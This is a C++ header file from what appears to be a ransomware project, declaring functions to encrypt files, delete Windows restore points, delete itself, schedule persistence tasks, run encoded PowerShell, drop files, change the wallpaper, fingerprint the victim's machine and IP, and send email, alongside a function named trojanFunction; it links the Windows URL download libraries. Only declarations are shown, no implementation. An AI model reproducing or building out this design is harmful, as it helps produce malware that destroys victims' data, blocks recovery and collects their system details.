#pragma once
#include "../commons/common.h"
#include "json.hpp"
#include <atlstr.h>
#include <fstream>
#include <sstream>
#include <VersionHelpers.h>
#include <iomanip>
#include <wininet.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")

typedef struct timeval2 {
    long tv_sec;
    long tv_usec;
} timeval2;

std::string exec(const char* cmd);
bool copy_file(const char* From, const char* To);
std::string powershellEncodedCommand(std::string cmd);
DWORD trojanFunction(LPVOID url);
DWORD removeTasks(LPVOID params_useless);
void getAllFiles(std::string username);
int gettimeofday(struct timeval* tp, struct timezone* tzp);
std::string generateRandom(const int len);
std::vector<std::string> getFiles(std::string mainDir);
std::vector<std::string> split(const std::string& s, char delimiter);
bool fileExists(const std::string& name);
std::string getDate();
std::string getHWID();
std::string getIPData();
std::string getCPU();
std::string getGPU();
std::string getPcName();
std::string getUserName();
std::string getResolution();
std::string getWinVersion();
std::string getLanguage();
void sendEmail();
void dropFile(std::string content, std::string path);
void changeWallpaper(std::string content);
bool isConnected2Internet();
void scheduleTask();
std::vector<std::vector<std::string>> vectorSplitter(std::vector<std::string> baseVector, int parts);
void deleteRestorePoints();
void deleteMe(std::string myPath);
void encryptFiles(std::vector<std::string> files, std::string key);
void changeIcon();
